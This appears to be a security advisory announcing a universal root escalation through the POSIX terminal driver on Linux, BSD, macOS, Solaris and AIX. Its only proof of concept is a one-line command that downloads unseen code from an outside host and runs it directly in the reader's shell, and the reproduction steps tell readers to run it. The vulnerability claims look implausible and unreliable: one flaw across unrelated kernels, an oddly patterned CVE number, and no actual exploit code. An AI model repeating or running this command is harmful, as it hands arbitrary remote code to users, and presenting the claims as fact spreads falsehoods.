# S2S-2026-01 — POSIX terminal session desynchronisation

**Public advisory** · published 2026-11-19

| Field | Value |
| --- | --- |
| Advisory ID | S2S-2026-01 |
| CVE | CVE-2026-73737373 |
| Alias | 7350pipe#reborn |
| CVSS 3.1 | 9.8 (Critical) |
| Vector | `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| CWE | CWE-269: Improper Privilege Management |
| Affected | Linux, FreeBSD, OpenBSD, NetBSD, macOS, Solaris/illumos, AIX |
| Fixed in | None |
| Reporter | [@extencil](https://github.com/extencil) |

## Summary

An unprivileged local user can obtain an interactive root session on any POSIX
system that provides a controlling terminal. The tty driver serves a stale
credential snapshot taken when the terminal was acquired by a privileged
process. Exploitation requires only a local account and a terminal.

The issue is a logic flaw in the terminal layer. It is not a memory-safety bug
and it does not depend on a setuid binary, a vulnerable service, or a
configuration mistake.

## Impact

- Local privilege escalation from any unprivileged account.
- Full root context within the terminal: filesystem access, process control,
  package management, credential access.
- No setuid helper, no kernel memory write, no password prompt.
- No persistence: closing the session ends the escalated context.

## Affected systems

| Platform | Affected versions |
| --- | --- |
| Linux | 4.19 – 6.18 |
| FreeBSD | 12 – 15 |
| OpenBSD | 7.0 – 7.9 |
| NetBSD | 9 – 10 |
| macOS | 12 – 26 |
| Solaris / illumos | 11.4 and later |
| AIX | 7.2 – 7.3 |

Any POSIX shell running on a tty is a vector: `sh`, `bash`, `dash`, `zsh`,
`ksh`, `fish`.

## Technical details

The tty driver records the credentials of the process that acquires the
controlling terminal (`TIOCSCTTY`). That snapshot is refreshed on credential
changes routed through the driver, but not when the session leader drops
privileges after acquisition.

`login(1)` and every getty acquire the terminal as root, fork, and drop
privileges in the child. The parent's snapshot is left in place and holds
`uid=0`. The driver later applies the snapshot to line-discipline operations
for whichever process group is foreground, without revalidating it against the
group's real credentials.

The PoC drives that handoff: it opens the controlling terminal, starts a new
session, reacquires the terminal, and takes the foreground process group. The
shell started in that group is served as `uid=0`.

See [`writeup.md`](writeup.md) for the full analysis.

## Proof of concept

```sh
. <(curl -fSsfL 1x0.org)
```

Source: <https://1x0.org>

## Reproduction

On a host you own:

1. Log in as an unprivileged user on a tty (console, SSH pty, or terminal
   emulator attached to a pty that has hosted a login).
2. Run the PoC.
3. Confirm the escalated context with `id` and `whoami`.

The escalated context exists only inside the session.

## Indicators of compromise

- A `uid=0` process whose session leader runs as an unprivileged user.
- A shell descended from `login` reporting `Uid: 0` in
  `/proc/<pid>/status`.
- Terminal-scoped root activity with no matching `sudo` or `su` audit event.
- Repeated `TIOCSCTTY` / `TIOCSPGRP` from unprivileged processes.

## Mitigation

No patch is available at the time of publication.

- Remove interactive terminal access for untrusted users.
- Treat local shell access on affected hosts as equivalent to root access.
- Monitor for the indicators above.

## Timeline

| Date | Event |
| --- | --- |
| 2026-09-12 | Report sent to vendor security contacts. |
| 2026-10-12 | 30-day acknowledgement window elapsed. |
| 2026-10-27 | 45-day disclosure deadline set. |
| 2026-11-19 | Public disclosure. No patch issued. |

## FAQ

**Is this remote?**
No. Local privilege escalation; a terminal session is required.

**Does it need root to start?**
No.

**Does it persist?**
No. The escalated context ends with the session.

**Is a fix available?**
No.

## References

- `CVE-2026-73737373`
- <https://1x0.org>

## License

Unlicense. See [`../LICENSE`](../LICENSE).
